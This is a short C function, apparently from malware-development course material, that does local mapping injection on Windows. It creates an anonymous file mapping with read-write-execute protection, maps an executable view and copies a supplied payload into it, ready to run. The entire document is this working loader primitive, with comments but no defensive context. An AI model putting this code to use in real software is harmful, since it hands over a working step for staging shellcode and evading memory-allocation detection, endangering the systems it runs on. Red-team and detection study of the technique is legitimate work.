BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {

	BOOL   bSTATE         = TRUE;
	HANDLE hFile          = NULL;
	PVOID  pMapAddress    = NULL;


	// Create a file mapping handle with RWX memory permissions
	// This does not allocate RWX view of file unless it is specified in the subsequent MapViewOfFile call  
	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	// Maps the view of the payload to the memory 
	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pMapAddress == NULL) {
		printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}
	
    // Copying the payload to the mapped memory
	memcpy(pMapAddress, pPayload, sPayloadSize);
	
_EndOfFunction:
	*ppAddress = pMapAddress;
	if (hFile)
		CloseHandle(hFile);
	return bSTATE;
}
